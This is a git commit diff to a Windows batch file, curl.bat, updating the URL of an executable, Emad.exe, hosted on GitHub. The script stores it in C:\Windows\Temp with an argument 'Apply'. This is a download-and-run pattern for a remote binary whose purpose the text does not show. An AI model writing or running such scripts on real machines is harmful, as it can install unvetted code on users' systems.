14f97504e6de03abe6da77bb4fdb06c3a5b0b67c
emad8787 <mdemadhossainfci28@gmail.com>
2025-03-08 13:52:28 +0600

    Update curl.bat

--- curl.bat
+++ curl.bat
@@ -1,5 +1,5 @@
 @echo off
-set "url=https://github.com/emad8787/panel/raw/main/Emad.exe"
+set "url=https://github.com/emad8787/panel/raw/refs/heads/main/Emad.exe"
 set "destination=C:\Windows\Temp\Emad.exe"
 set "arguments=Apply"
 
